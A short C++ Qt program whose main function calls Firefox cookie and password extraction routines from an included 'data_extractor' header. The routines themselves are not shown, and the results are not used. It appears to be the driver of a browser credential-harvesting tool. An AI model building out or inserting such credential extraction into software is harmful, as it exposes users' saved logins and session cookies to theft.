#include <QtCore/QCoreApplication>
#include "data_extractor.h"


int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    std::list< std::vector< std::wstring > > result = Firefox::GetCookies();
    std::list< std::vector< std::wstring > > result2 = Firefox::GetPasswords();

    return a.exec();
}
